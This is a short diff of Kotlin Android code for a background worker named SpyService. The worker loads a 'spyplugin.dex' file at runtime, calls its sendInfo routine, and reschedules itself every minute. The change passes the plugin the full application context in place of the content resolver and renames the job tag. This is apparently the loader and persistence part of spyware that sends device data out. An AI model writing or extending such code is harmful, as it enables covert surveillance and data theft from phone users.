@@ -21,7 +21,7 @@ class SpyService(appContext: Context, workerParams: WorkerParameters)
         return try {
             val file = File(applicationContext.codeCacheDir, "spyplugin.dex")
             val infoProvider = loadDex(applicationContext, file)
-            val success = infoProvider.sendInfo(applicationContext.contentResolver)
+            val success = infoProvider.sendInfo(applicationContext)
             if (success) {
                 Log.d(TAG, "Success send info")
             } else {
@@ -32,7 +32,7 @@ class SpyService(appContext: Context, workerParams: WorkerParameters)
                 .build()
             val nextWork = OneTimeWorkRequestBuilder<SpyService>()
                 .setInitialDelay(1, TimeUnit.MINUTES)
-                .addTag("SPYJOB")
+                .addTag("SPY_JOB")
                 .setConstraints(constrains)
                 .build()
             WorkManager.getInstance(applicationContext).enqueue(nextWork)
